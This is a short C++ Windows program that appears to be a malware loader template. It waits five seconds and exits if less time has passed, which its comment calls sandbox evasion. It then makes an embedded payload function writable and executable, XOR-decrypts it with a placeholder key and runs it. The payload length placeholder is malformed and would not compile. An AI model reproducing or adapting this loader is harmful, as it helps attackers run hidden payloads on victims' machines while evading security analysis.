#include <stdio.h>
#include <Windows.h>
#include <chrono>
#include <thread>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning(disable : 4996)

extern "C" void RunData();

// XOR32 decryption
void xor32(unsigned char* data, int len, const char* key) {
    int keylen = strlen(key);
    int keyIndex = 0;
    for (int i = 0; i < len; i++) {
        data[i] ^= key[keyIndex++];
        keyIndex %= keylen;
    }
}

int main(int argc, char** argv) {
    // Simple sandbox evasion
    auto start = std::chrono::system_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = end - start;
    if (elapsed_seconds.count() <= 4.5) {
        exit(0);
    }

    // Run our payload function
    const char* key = "your_key_here"; // modify with your key
    int len = 0x0x0x0x; // modify with payload length

    DWORD oldProtect = 0;
    if (!VirtualProtect((LPVOID)&RunData, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Error: %d", GetLastError());
    }

    xor32((unsigned char*)&RunData, len, key);
    VirtualProtect((LPVOID)&RunData, len, oldProtect, &oldProtect);
    RunData();
}

